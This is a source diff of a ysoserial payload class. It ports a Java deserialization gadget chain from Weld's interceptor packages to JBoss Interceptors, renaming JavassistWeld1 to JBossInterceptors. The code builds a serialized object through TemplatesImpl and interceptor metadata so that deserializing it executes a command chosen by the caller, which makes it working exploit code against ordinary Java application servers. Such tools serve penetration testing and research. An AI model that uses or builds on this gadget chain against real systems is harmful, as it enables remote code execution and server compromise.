@@ -1,19 +1,19 @@
 package ysoserial.payloads;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
-import org.jboss.weld.interceptor.builder.MethodReference;
-import org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory;
-import org.jboss.weld.interceptor.proxy.InterceptorMethodHandler;
-import org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference;
-import org.jboss.weld.interceptor.reader.DefaultMethodMetadata;
-import org.jboss.weld.interceptor.reader.ReflectiveClassMetadata;
-import org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata;
-import org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator;
-import org.jboss.weld.interceptor.spi.metadata.InterceptorReference;
-import org.jboss.weld.interceptor.spi.metadata.MethodMetadata;
-import org.jboss.weld.interceptor.spi.model.InterceptionModel;
-import org.jboss.weld.interceptor.spi.model.InterceptionType;
+import org.jboss.interceptor.builder.InterceptionModelBuilder;
+import org.jboss.interceptor.builder.MethodReference;
+import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
+import org.jboss.interceptor.proxy.InterceptorMethodHandler;
+import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
+import org.jboss.interceptor.reader.DefaultMethodMetadata;
+import org.jboss.interceptor.reader.ReflectiveClassMetadata;
+import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
+import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
+import org.jboss.interceptor.spi.metadata.InterceptorReference;
+import org.jboss.interceptor.spi.metadata.MethodMetadata;
+import org.jboss.interceptor.spi.model.InterceptionModel;
+import org.jboss.interceptor.spi.model.InterceptionType;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -25,8 +25,8 @@ import java.util.*;
     by @matthias_kaiser
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
-@Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.weld:weld-core:1.1.33.Final"})
-public class JavassistWeld1 implements ObjectPayload<Object> {
+@Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final" })
+public class JBossInterceptors implements ObjectPayload<Object> {
 
     public Object getObject(final String command) throws Exception {
 
@@ -37,7 +37,7 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
         InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);
 
         Set<InterceptionType> s = new HashSet<InterceptionType>();
-        s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
+        s.add(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
 
         Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
         defaultMethodMetadataConstructor.setAccessible(true);
@@ -46,9 +46,9 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
 
         List list = new ArrayList();
         list.add(methodMetadata);
-        Map<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();
+        Map<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();
 
-        hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
+        hashMap.put(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
         SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);
 
         builder.interceptAll().with(simpleInterceptorMetadata);
@@ -74,6 +74,6 @@ public class JavassistWeld1 implements ObjectPayload<Object> {
 
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(JavassistWeld1.class, args);
+        PayloadRunner.run(JBossInterceptors.class, args);
     }
 }
